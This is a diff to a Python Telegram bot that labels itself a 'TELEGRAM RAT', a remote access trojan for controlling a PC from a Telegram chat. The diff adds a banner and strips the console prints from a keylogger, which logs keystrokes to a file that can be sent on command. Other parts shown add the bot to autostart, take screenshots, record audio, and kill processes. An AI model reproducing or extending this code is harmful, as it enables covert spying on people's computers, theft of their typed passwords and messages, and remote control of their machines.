@@ -27,6 +27,26 @@ bot = telebot.TeleBot(mytoken)
 
 mainkeyboard = telebot.types.ReplyKeyboardMarkup()
 
+banner = """
+
+███─███─█───███─████─████─████─█───█
+─█──█───█───█───█────█──█─█──█─██─██
+─█──███─█───███─█─██─████─████─█─█─█
+─█──█───█───█───█──█─█─█──█──█─█───█
+─█──███─███─███─████─█─█──█──█─█───█
+
+
+████─████─███
+█──█─█──█──█
+████─████──█
+█─█──█──█──█
+█─█──█──█──█
+
+https://github.com/simple-user-kali/PC-management-via-telegram-bot
+"""
+
+print(banner)
+
 mainkeyboard.add('Питание🟢','Запись🔊','Браузер🟡','Приложения🟥','ip🈴','Скриншот👀','Помощь⚒')
 
 
@@ -34,13 +54,9 @@ powerkeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
 
 powerkeyboard.add('Назад🗿','Выключить пк⚠️','Перезагрузить пк🖥')
 
-
 appkeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=3)
 
 appkeyboard.add('Назад🗿','Убить приложение❌','Включить приложение✅')
-
-
-
 
 @bot.message_handler(content_types=['text'])
 def commands(message):
@@ -143,14 +159,11 @@ def commands(message):
                 bot.send_message(message.chat.id,'Кейлоггер вкл,что бы получить файл /send')
                 def on_press(key):
                         try:
-                                print('alphanumeric key {0} pressed'.format(
-                                key.char))
                                 item = open('pressed.txt','a+')
                                 item.write(f'|{key.char}|')
                                 item.close
                         except AttributeError:
-                                print('special key {0} pressed'.format(
-                                key))
+                                pass
 
                 def on_release(key):
                         print('{0} released'.format(
@@ -194,10 +207,6 @@ def commands(message):
                         bot.send_message(message.chat.id,'добавил в автозагрузку')
                 except:
                         bot.send_message(message.chat.id, 'ошибка,не добавил в автозагрузку|PS(МБ не сменил имя файла оно стандартно Название)')
-
-
-
-
 
 def get_record(message):
         global record
@@ -252,9 +261,6 @@ def get_record(message):
         except:
                 bot.send_message(message.chat.id,'в числовом формате!',reply_markup=mainkeyboard)
 
-
-
-
 def get_audio(message):
         global audio
         audio = message.text
@@ -264,19 +270,11 @@ def get_audio(message):
         except:
                 bot.send_message(message.chat.id,'Не нашел данный файл\n ' + audio,reply_markup=mainkeyboard)
 
-
-
-
-
-
 def get_url(message):
         global url
         url = message.text
         webbrowser.open_new_tab(url)
         bot.send_message(message.chat.id,'Ссылка открыта!',reply_markup=mainkeyboard)
-
-
-
 
 def get_process(message):
         global process
@@ -287,10 +285,6 @@ def get_process(message):
         except:
                  bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!',reply_markup=mainkeyboard)
 
-
-
-
-
 def get_kill(message):
         global kill
         kill = message.text
@@ -299,9 +293,6 @@ def get_kill(message):
                 bot.send_message(message.chat.id,'Данный процесс убит\n' + kill,reply_markup=appkeyboard)
         except:
                 bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!',reply_markup=mainkeyboard)
-
-
-
 
 try:
         bot.polling(none_stop=True, interval=0)
